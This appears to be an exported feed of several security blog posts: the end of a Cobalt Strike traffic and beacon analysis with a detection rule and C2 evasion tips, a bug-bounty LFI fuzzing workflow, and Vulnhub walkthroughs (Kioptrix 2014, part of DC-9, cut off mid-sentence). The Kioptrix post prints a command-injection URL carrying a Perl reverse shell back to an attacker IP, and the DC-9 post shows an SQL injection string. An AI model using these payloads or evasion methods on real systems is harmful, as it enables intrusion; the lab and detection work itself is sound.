title="HTTPS流量特征"></a>HTTPS流量特征</h2><p>对于CS的HTTPS流量特征，除了一般特征外，还能从Client Hello报文中获取一些信息：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410235127740"></p><p>JA3 用于收集Client Hello数据包中以下字段的十进制值：包括版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。然后，用<code>,</code>来分隔各个字段、用<code>-</code>来分隔各个字段中的各个值，将这些值串联在一起之后，计算 <code>MD5</code>，就是一个ja3。如果没有某个字段，则这些字段的值为空。</p><p>从报文中可以看出JA3的值，根据这个md5值，可以直接与参考值进行比对，确定是否为某些工具。</p><p>参考链接：<a href="https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt">https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt</a></p><p>推荐使用[ja3box][<a href="https://github.com/Macr0phag3/ja3box]%E5%B7%A5%E5%85%B7%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%AE%A1%E7%AE%97%E7%9B%B8%E5%BA%94%E5%80%BC%EF%BC%8C%E8%BF%99%E9%87%8C%E9%87%87%E7%94%A8%E8%BE%93%E5%85%A5pcap%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%9A">https://github.com/Macr0phag3/ja3box]工具，自动计算相应值，这里采用输入pcap的方式：</a></p><p><img src="/2023/04/27/file-upload/g" alt="image-20220410235952943"></p><p>比对发现为CS工具：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220411000145195"></p><h3 id="隐藏方法-2"><a href="#隐藏方法-2" class="headerlink" title="隐藏方法"></a>隐藏方法</h3><ul><li><p>修改HTTPS证书</p></li><li><p>通过<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>，修改默认请求配置，改成高可信厂商</p></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ul><li>端口转发</li><li>域前置</li><li>云函数</li></ul><h2 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h2><p>1、报文中出现大量&#x2F;en_US&#x2F;all.js的请求，但是下载文件后查看文件内容为空，不清楚原理：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410220940372"></p><p>2、同一台主机中的Cookie，通过脚本解密后能得到</p><p><img src="/2023/04/27/file-upload/g" alt="cookie"></p><p>其中beacon id就是submit.php?id&#x3D;x中的值，但是从cookie中无法提取有效的CS特征。</p><p>3、hs7001规则，无法命中攻击报文，十六进制串不清楚提取原理。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">alert TCP any any -&gt; any any (msg:<span class="hljs-string">&quot;Tool Cobalt Strike Attack - Interactive Vulnerability&quot;</span>; <span class="hljs-attribute">flow</span>:to_server; uricontent:<span class="hljs-string">&quot;/submit.php?id=&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;Content-Type: application/octet-stream&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;Connection: Keep-Alive&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;|00 00 00 40 00 00 00 02 00 00 00 1e 00 00 00 1e|&quot;</span>; distance:<span class="hljs-number">0</span>; sid:hs7001;)<br></code></pre></td></tr></table></figure><p>4、现网CS server扫描方法，通过发送特定字符串，看响应</p><h2 id="Beacon样本分析"><a href="#Beacon样本分析" class="headerlink" title="Beacon样本分析"></a>Beacon样本分析</h2><p>此处以不分段样本举例。</p><p>首先查看导入表：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220411091723512"></p><p>可以看到几个明显的函数，例如CreateNamedPipeA,CreateThread等等。</p><p>接下来查看main函数，F5：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411092057926"></p><p>有两个函数27B0和1800，接着是死循环，sleep10秒，查看第一个函数：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411092234879"></p><p>该函数没有特别的功能，重点是第二个函数，双击查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411092407345"></p><p>该函数中，首先V0为GetTickCount()，返回从操作系统启动所经过的毫秒数，接下来拼接处Buffer的值，将16进制数转换成char，可以看到Buffer为<code>\\.\\pipe\\MSSE-v0-server</code>，也就是管道名称，通过日志查看PipeName：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411093159702"></p><p>结合汇编代码查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411093637992"></p><p>1800函数拼接了一个管道名称，然后创建线程执行sub_4016D3函数.。</p><p>接下来查看16D3函数：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411222622839"></p><p>16D3函数中又调用了1608函数，查看内容如下：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411222823870"></p><p>该函数进行了创建管道与链接管道操作，并通过WriteFile将数据写入到管道中。</p><p>结合OD查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411223415773"></p><p>此时管道名为<code>\\.\pipe\MSSE-8298-server</code>，接着创建管道，连接，将edi指向的数据写入管道(x86_s.00403010)，查看该地址：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411223609880"></p><p>数据写入后，该线程完成，jmp到sub_4017A2:</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411224228022"></p><p>首先分配一段内存，调用sub_4016F2，查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411225448071"></p><p>这里通过ReadFile去读取先前写入管道的数据。读取完之后，跳到sub_401559：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411230004241"></p><p>接着通过VirtualAlloc分配内存，然后通过一个循环异或解密数据放入到这片内存中。</p><p>查看OD：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411231043647"></p><p>前面的分析可知，这里是在循环异或四个字节的数据，四字节位置是[ebp+10]的，也就是x86_s.00403008:</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411231209582"></p><p>大概的外层逻辑就是这样，不断的通过管道读写数据。因此，beacon.exe其实是一个外层的loader，而真正的核心的其中的shellcode。接下来使用海珍的方法直接提取出PE文件。</p><p>直接查看main，跟入sub_401800,由于401800return了sun_4017A2,继续跟踪，到达sub_401559，查看401559，直接在最后一个call下断点，debug：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411232255418"></p><p>运行：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411155147952"></p><p>加载脚本：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> idc import *<br>tmp_list = []<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">byte</span> <span class="hljs-keyword">in</span> idc.GetManyBytes(<span class="hljs-number">0x6c0000</span>, <span class="hljs-number">0x33000</span>):<br>    tmp_list.append(<span class="hljs-keyword">byte</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dump.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.<span class="hljs-built_in">write</span>(<span class="hljs-keyword">bytes</span>(tmp_list))<br>print(<span class="hljs-string">&quot;success&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过file–&gt;script file：</p><p><img src="/2023/04/27/file-upload/" alt="file"></p><p>可以提取出dump.bin.</p><p>拖进exe info:</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411232540644"></p><p>可以看出为dll文件。</p><p>对于更深层次的特征分析例如ip，host等，需要对dll文件进行逆向，难度较大，等相关知识完善后进行补充。</p><p>但是通过简单查看导入表，可以猜测出dll的部分功能：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411234121140"></p><p>可以看到createremotethread（进程注入），createnamedpipe（创建命名管道）等等操作。</p><p>通过上述分析，可以得到当前版本的CS(4.0)，存在的特征如下：</p><ul><li>data段偏移0xC处为连续的4个a</li><li>rdata头部的管道名格式：%c%c%c%c%c%c%c%c%cMSSE-%d-server</li></ul><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>对TLS报文作一定处理，通过JA3的原理进行防护？</p><p>WAF对URL进行处理，检验URL合法性的算法？</p><p>是否可以通过nmap的原理，进行扫描？</p><p>引擎判断一定误差内同一个IP相同时间间隔的请求？（可以解决CS的sleep，以及各类爆破，注入工具等等，实现难度可能较大）</p><p>使用yara规则对命名管道进行查询？</p><p>对于data段0xC处的aaaa特征是否有方法检测到？</p>]]></content>
    
    
    <categories>
      
      <category>C2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugbounty Automation 01——LFI自动化</title>
    <link href="/2024/07/23/Bugbounty%20Automation%2001%E2%80%94%E2%80%94LFI%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <url>/2024/07/23/Bugbounty%20Automation%2001%E2%80%94%E2%80%94LFI%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>在阅读了各类文章之后发现，其实针对各类漏洞的自动化挖掘都或多或少已经有一些脚本，但是原理和利用的工具都有所差异，因此决定自己动手实现。<br>初步的设想是，依托于 redis 数据库的任务队列特性，自动化进行子域名挖掘，参数挖掘，js 文件泄露，漏洞检测等等功能，并进行消息的即时推送。</p><h2 id="LFI-漏洞"><a href="#LFI-漏洞" class="headerlink" title="LFI 漏洞"></a>LFI 漏洞</h2><p>本地文件包含漏洞(Local File Inclusion)是一种常见的 web 安全漏洞。当应用程序将用户输入的数据作为文件名包含（include）到服务器端的文件中时，由于缺乏对输入数据的适当验证，攻击者可以包含服务器上的其他文件，甚至是敏感文件。<br>一般会造成任意文件读取甚至远程代码执行。</p><h2 id="自动化流程"><a href="#自动化流程" class="headerlink" title="自动化流程"></a>自动化流程</h2><h3 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h3><p>子域名挖掘的工具很多，下面列举部分常见的：</p><ul><li><a href="https://github.com/tomnomnom/assetfinder">https://github.com/tomnomnom/assetfinder</a></li><li><a href="https://github.com/YashGoti/crtsh">https://github.com/YashGoti/crtsh</a></li><li><a href="https://github.com/gwen001/github-subdomains">https://github.com/gwen001/github-subdomains</a></li><li><a href="https://github.com/owasp-amass/amass">https://github.com/owasp-amass/amass</a></li><li><a href="https://github.com/tomnomnom/assetfinder">https://github.com/tomnomnom/assetfinder</a></li><li><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>…<br>这部分尽量使用尽可能多的工具，保证收集到的子域名尽量全面。<br>所有工具跑出来的结果放到一个文件里，进行去重处理。<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> domains | assetfinder -subs-<span class="hljs-keyword">only</span><br>subfinder -d vulnweb.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">o</span> results.txt<br>...<br></code></pre></td></tr></table></figure></li></ul><h3 id="参数挖掘"><a href="#参数挖掘" class="headerlink" title="参数挖掘"></a>参数挖掘</h3><p>在获取到子域名之后，对每个域名进行参数的挖掘，这部分为了提高效率，需要先进行判活，再对相似的站点进行过滤等等，后面会单独写一篇文章讨论信息收集（子域名挖掘和参数挖掘）的内容。<br>这里利用 paramspider 工具：<br><a href="https://github.com/devanshbatham/ParamSpider">https://github.com/devanshbatham/ParamSpider</a><br><code>paramspider -d [domain] -o results.txt </code><br><img src="/2023/04/27/file-upload/240412144948960.png"><br>结果如下：<br><img src="/2023/04/27/file-upload/240412145009453.png"></p><h3 id="FFUF"><a href="#FFUF" class="headerlink" title="FFUF"></a>FFUF</h3><p>收集完参数之后，用 FFUF 进行探测。<br><a href="https://github.com/ffuf/ffuf">ffuf&#x2F;ffuf: Fast web fuzzer written in Go (github.com)</a><br><code>for URL in $(&lt;results.txt); do (ffuf -u &quot;$&#123;URL&#125;&quot; -c -w LFI-Jhaddix.txt -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done</code><br>其中- </p><ul><li>-mc 200：只匹配 HTTP 状态码为200的响应。</li><li>-ac：自动调整请求的并发数。</li><li>-sa：禁用自动大小写变异。</li><li>-t 20：设置请求的超时时间为20秒。</li><li>-or：将结果输出到屏幕。</li><li>-od ffuf_lfi_results：将结果输出到指定的目录<code>ffuf_lfi_results</code>。<br>直接用 bash 命令，对 paramspider 的结果进行遍历，用到的字典为 seclist 中的 LFI-Jhaddix.txt:<br><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt</a></li></ul><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>在上一步之后，生成的文件内容如下：<br><img src="/2023/04/27/file-upload/240412150801610.png"><br>再通过 grep 命令筛选敏感内容。<br><code>grep -Ril &quot;root:x&quot; ffuf_lfi_results/ | tee VULNERABLE.txt</code></p><ul><li>-R：以递归的方式搜索所有子目录。</li><li>-i：在搜索时忽略大小写</li><li>-l ：只输出包含匹配字符串的文件名，而不输出匹配行的内容。</li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>SRC</tag>
      
      <tag>automation</tag>
      
      <tag>LFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_2014</title>
    <link href="/2024/07/23/vulnhub_kioptrix_2014/"/>
    <url>/2024/07/23/vulnhub_kioptrix_2014/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-2014"><a href="#vulnhub-kioptrix-2014" class="headerlink" title="vulnhub_kioptrix_2014"></a>vulnhub_kioptrix_2014</h1><p>Finally arrived at the last box of the Kioptrix series!</p><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>I’ll start by seeking for open ports on the target box.I prefer using masscan and namp for this initial task.</p><p><img src="/2023/04/27/file-upload/image-20231113112052955.png" alt="image-20231113112052955"></p><p>The only service that exposed to us is HTTP on port 80 and port 8080.</p><p>Next step I ultilize dirsearch for directory brute-force, but I could find nothing interesting.</p><p><img src="/2023/04/27/file-upload/image-20231113112109035.png" alt="image-20231113112109035"></p><p>Let’s check them out in firefox:</p><p><img src="/2023/04/27/file-upload/image-20231113112121440.png" alt="image-20231113112121440"></p><p>It reminds me of 403 FORBIDDEN when I access port 8080.Then I shifted my focus to port 80.</p><p><img src="/2023/04/27/file-upload/image-20231113112139060.png" alt="image-20231113112139060"></p><p>It works! However, there is only the phrase “it works,” XD.</p><h4 id="Grabbing-a-shell"><a href="#Grabbing-a-shell" class="headerlink" title="Grabbing a shell"></a>Grabbing a shell</h4><p>Let’s dig deeper — view page source:</p><p><img src="/2023/04/27/file-upload/image-20231113112158809.png" alt="image-20231113112158809"></p><p>Well, now we get something new!</p><p><img src="/2023/04/27/file-upload/image-20231113112209835.png" alt="image-20231113112209835"></p><p>I failed to find file upload or command injection vulnerabilities that could help me access a reverse shell when I explore this new page. However, <code>pChart2.1.3</code> in url seized my attention.</p><p><img src="/2023/04/27/file-upload/image-20231113112221479.png" alt="image-20231113112221479"></p><p>The following steps are quite explicit.</p><p><img src="/2023/04/27/file-upload/image-20231113112232895.png" alt="image-20231113112232895"></p><p>It’s evident that there exists a arbitrary file read vulnerability.</p><p><img src="/2023/04/27/file-upload/image-20231113112247139.png" alt="image-20231113112247139"></p><p>However, we cannot rely on this vulnerability to gain access to the box, we must integrate it with other vulnerabilities. At this point, I recalled the earlier 403 page.</p><p>I googled default path of apache config file:</p><p><img src="/2023/04/27/file-upload/image-20231113112302555.png" alt="image-20231113112302555"></p><p>Let’s go to check its configuration:</p><p><img src="/2023/04/27/file-upload/image-20231113112314281.png" alt="image-20231113112314281"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Allow <span class="hljs-keyword">from</span> <span class="hljs-attribute">env</span>=Mozilla4_browser<br></code></pre></td></tr></table></figure><p>Access port 8080 using burp suite to check User-Agent.</p><p><img src="/2023/04/27/file-upload/image-20231113112332206.png" alt="image-20231113112332206"></p><p>Turn to proxy-settings, Match and replace rules, and then ticket Mozilla&#x2F;4.0:</p><p><img src="/2023/04/27/file-upload/image-20231113112343264.png" alt="image-20231113112343264"></p><p>Let’s try again:</p><p><img src="/2023/04/27/file-upload/image-20231113112433172.png" alt="image-20231113112433172"></p><p>BINGO! Now we can access port 8080.</p><p><img src="/2023/04/27/file-upload/image-20231113112543854.png" alt="image-20231113112543854"></p><p>Nevigate phptax directory and I cound not understand the presented page.</p><p>At this step, I will also suggest searchsploit:</p><p><img src="/2023/04/27/file-upload/image-20231113112556288.png" alt="image-20231113112556288"></p><p><img src="/2023/04/27/file-upload/image-20231113112602381.png" alt="image-20231113112602381"></p><p>So far, I can use the vulnerability mentioned above to grab a reverse shell by accessing the following page:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.122.17:8080</span>/phptax/drawimage.php?pfilez=xxx;perl+-e+%<span class="hljs-number">27</span>use+Socket%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>i%<span class="hljs-number">3</span>D%<span class="hljs-number">22192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">111</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>p%<span class="hljs-number">3</span>D4444%<span class="hljs-number">3</span>Bsocket%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>CPF_INET%<span class="hljs-number">2</span>CSOCK_STREAM%<span class="hljs-number">2</span>Cgetprotobyname%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>tcp%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>connect%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>Csockaddr_in%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>p%<span class="hljs-number">2</span>Cinet_aton%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>i%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">7</span>Bopen%<span class="hljs-number">28</span>STDIN%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDOUT%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDERR%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bexec%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fsh+-i%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">27</span>;&amp;pdf=make<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231113112706972.png" alt="image-20231113112706972"></p><h4 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h4><p>We can identify the system version of the target box as FREEBSD 9.0-RELEASE and we can easily find two poc using searchsploit.</p><p><img src="/2023/04/27/file-upload/image-20231113112718365.png" alt="image-20231113112718365"></p><p>I transfer the poc through nc because wget and some other commands are unavailable.</p><p><img src="/2023/04/27/file-upload/image-20231113112738209.png" alt="image-20231113112738209"></p><p>Compile and execute:</p><p><img src="/2023/04/27/file-upload/image-20231113112754343.png" alt="image-20231113112754343"></p><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_DC_9</title>
    <link href="/2024/07/23/vulnhub_DC_9/"/>
    <url>/2024/07/23/vulnhub_DC_9/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-DC-9"><a href="#vulnhub-DC-9" class="headerlink" title="vulnhub_DC_9"></a>vulnhub_DC_9</h1><p>In this article, I’m going to crack the DC-9 box of DC series in vulnhub.</p><p>portscan:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[~/Desktop]<br>└─<span class="hljs-comment"># nmap -sC -sV 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span><span class="hljs-number">-11</span><span class="hljs-number">-13</span> <span class="hljs-number">20</span>:<span class="hljs-number">41</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span><br>Host is up (<span class="hljs-number">0.00029</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE    SERVICE VERSION<br><span class="hljs-number">22</span>/tcp filtered ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>     <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br>|<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.38</span> (Debian)<br>|<span class="hljs-title">_http-title</span>: Example.com - Staff Details - Welcome<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">7.63</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><p>It seems that only port 80 is open. Port 22 is filtered, let’s put it on hold for now.</p><p>When it comes to port 80, I will make an attempt to dirsearch and nikto subconsciously.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/Desktop]<br>└─# dirsearch -u http://192.168.122.20<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                  <br> (_||| _) (/_(_|| (_| )                                                                                                                                                                                           <br>                                                                                                                                                                                                                  <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.122.20/_23-11-13_20-48-30.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-11-13_20-48-30.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.122.20/<br><br>[20:48:30] Starting: <br>[20:48:32] 403 -  279B  - /.ht_wsr.txt                                     <br>[20:48:32] 403 -  279B  - /.htaccess.save                                  <br>[20:48:32] 403 -  279B  - /.htaccess.bak1<br>[20:48:32] 403 -  279B  - /.htaccess.sample<br>[20:48:32] 403 -  279B  - /.htaccess_sc<br>[20:48:32] 403 -  279B  - /.htaccess.orig<br>[20:48:32] 403 -  279B  - /.htaccess_orig<br>[20:48:32] 403 -  279B  - /.htaccess_extra<br>[20:48:32] 403 -  279B  - /.htaccessBAK<br>[20:48:32] 403 -  279B  - /.htaccessOLD                                    <br>[20:48:32] 403 -  279B  - /.htaccessOLD2<br>[20:48:32] 403 -  279B  - /.htm<br>[20:48:33] 403 -  279B  - /.html<br>[20:48:33] 403 -  279B  - /.htpasswd_test<br>[20:48:33] 403 -  279B  - /.httr-oauth                                     <br>[20:48:33] 403 -  279B  - /.htpasswds                                      <br>[20:48:34] 403 -  279B  - /.php                                            <br>[20:48:55] 200 -    0B  - /config.php                                       <br>[20:48:56] 301 -  314B  - /css  -&gt;  http://192.168.122.20/css/              <br>[20:48:58] 200 -    3KB - /display.php                                      <br>[20:49:04] 200 -  747B  - /includes/                                        <br>[20:49:04] 301 -  319B  - /includes  -&gt;  http://192.168.122.20/includes/    <br>[20:49:04] 200 -  917B  - /index.php                                        <br>[20:49:04] 200 -  917B  - /index.php/login/                                 <br>[20:49:08] 302 -    0B  - /logout.php  -&gt;  manage.php                       <br>[20:49:08] 200 -    1KB - /manage.php                                       <br>[20:49:20] 200 -    1KB - /search.php                                       <br>[20:49:20] 403 -  279B  - /server-status                                    <br>[20:49:20] 403 -  279B  - /server-status/                                   <br>┌──(root㉿kali)-[~]<br>└─# nikto -h 192.168.122.20   <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.122.20<br>+ Target Hostname:    192.168.122.20<br>+ Target Port:        80<br>+ Start Time:         2023-11-13 20:48:36 (GMT-5)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.38 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /config.php: PHP Config file may contain database IDs and passwords.<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /includes/: Directory indexing found.<br>+ /includes/: This might be interesting.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host<br>+ End Time:           2023-11-13 20:49:08 (GMT-5) (32 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>The size of the config.php page is 0B, where an arbitrary file read vulnerability may be needed to obtain certain configuration information.</p><p>Here are also some 200-code pages, let’s check them out using firefox.</p><p><img src="/2023/04/27/file-upload/image-20231114103757119.png" alt="image-20231114103757119"></p><p>Brute force, SQLI — failed.</p><p>Display.php shows all user information and search.php privodes a input form for specific seaerching.</p><p><img src="/2023/04/27/file-upload/image-20231114104151851.png" alt="image-20231114104151851"></p><p><img src="/2023/04/27/file-upload/image-20231114104712219.png" alt="image-20231114104712219"></p><p>It displayed correct result when I input mary, however when I tried <code>0&#39; or 1=1 #</code> it responsed with whole 